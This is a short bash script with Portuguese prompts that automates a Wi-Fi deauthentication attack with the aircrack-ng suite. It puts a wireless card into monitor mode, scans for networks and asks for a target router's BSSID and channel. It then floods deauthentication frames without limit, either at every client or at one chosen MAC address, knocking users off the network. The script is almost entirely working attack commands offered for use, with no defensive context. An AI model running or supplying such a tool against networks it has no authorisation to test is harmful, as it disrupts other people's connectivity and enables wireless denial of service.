#!/bin/bash
if (( $EUID != 0 )); then
  echo -e "\nMust be run as root!"
  exit 1
fi
echo
echo
echo " W   W   W || / I &   &   666  %%%%"
echo "  W W W W  ||/  I &   &   66   & %"
echo "   W   W   ||\  I &&& &&& 6666 &  %"
echo
echo
airmon-ng check kill; airmon-ng check; sudo iwconfig | grep wlan
echo -n "qual é a placa de rede? "
read wlan
airmon-ng start $wlan
read -n 1 -s -p "tecla p continuar..."
echo -n "placa em modo monitor > "
read mon
airodump-ng $mon;
echo -n "bssid do router > "
read bssid
echo -n "o channel > "
read channel
airodump-ng mon0 --bssid $bssid --channel $channel
echo -n "todos?(s/n)"
read t
trap 'killall' INT
killall() {
	airmon-ng stop $mon
	echo "**** You ended it ****"     # added double quotes
	kill -TERM 0         # fixed order, send TERM not INT
	wait
}
if [ "$t" = "s" ]
then
	echo "Depois desliga o monitor mode (# airmon-ng stop mondevice)"
	for i in {3..1};do echo -n "$i." && sleep 1; done
	aireplay-ng -0 0 -a $bssid $mon &
else
	echo -n "mac do cliente > "
	read cliente
	echo "Depois desliga o monitor mode (# airmon-ng stop *mondevice*)"
	for i in {3..1};do echo -n "$i." && sleep 1; done
	aireplay-ng -0 0 -a $bssid -c $cliente $mon
fi
cat
